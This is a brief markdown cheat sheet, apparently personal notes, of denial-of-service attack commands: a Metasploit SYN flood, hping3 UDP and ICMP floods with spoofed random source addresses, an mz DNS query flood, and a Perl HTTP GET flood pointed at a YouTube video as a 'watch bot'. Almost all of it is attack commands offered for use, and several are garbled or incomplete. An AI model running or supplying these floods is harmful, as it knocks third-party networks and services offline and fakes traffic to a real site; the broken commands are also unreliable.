### Send the DOS

```
use auxiliary/dos/tcp/synflood
show options
set RHOSTS ...
exploit
```

### UDP DOS Attack

```
nmap ... -sU
hping3 --udp ... -p 53 --flood --rand-source -E ....txt -d 55
```

### Search Port 

```nmap ... -sU -p 67```

### Dos Change Ip

```
hping3
-S ip to attack --ip to spoof
```

#### Monitoring the Attack


```WireShark``` = To myself
```tcpdump host ...``` = Across

### DNS Attack

```
apt -get install mz
nmap -ST -sU ... -p 53/67
mz -A rand -B ... -t "q=site id" -c 1000
```

### Http Get Flood Attack - Youtube Watch Bot

```
cd httpflooder
perl httpflooder.pl -a GF -h youtube.com --url "/watch?v=LgFTlcMsfgaO2UE" -n 100
```

### Imcp Attack

```hping3 --icmp ... -- flood --rand-source```